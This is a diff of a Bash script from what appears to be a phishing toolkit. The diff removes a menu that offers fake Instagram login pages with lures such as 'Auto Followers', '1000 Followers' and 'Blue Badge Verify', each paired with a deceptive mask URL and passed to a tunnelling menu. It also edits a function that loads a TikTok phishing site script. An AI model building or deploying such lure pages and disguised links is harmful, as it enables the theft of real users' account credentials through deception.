@@ -1,48 +1,4 @@
 
-## Reset terminal colors
-reset_color() {
-	tput sgr0   # reset attributes
-	tput op     # reset color
-	return
-}
-
-
-## Instagram
-site_instagram_fixed() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	case $REPLY in 
-		1 | 01)
-			website="instagram"
-			mask='https://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		2 | 02)
-			website="ig_followers"
-			mask='https://get-unlimited-followers-for-instagram'
-			tunnel_menu;;
-		3 | 03)
-			website="insta_followers"
-			mask='https://get-1000-followers-for-instagram'
-			tunnel_menu;;
-		4 | 04)
-			website="ig_verify"
-			mask='https://blue-badge-verify-for-instagram-free'
-			tunnel_menu;;
-		*)
-			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; clear; banner_small; site_instagram; };;
-	esac
-}
-
 dependencies_install_fixed(){
 	
 	if [[ -d "/data/data/com.termux/files/home" ]]; then
@@ -85,8 +41,8 @@ dependencies_install_fixed(){
 	fi
 }
 funh(){
-	. .sites/lineartiktok.sh
-	tiktok
+	. sites/lineartiktok.sh
+	tiktok $1
 }
 download_fixed() {
 	url="$1"
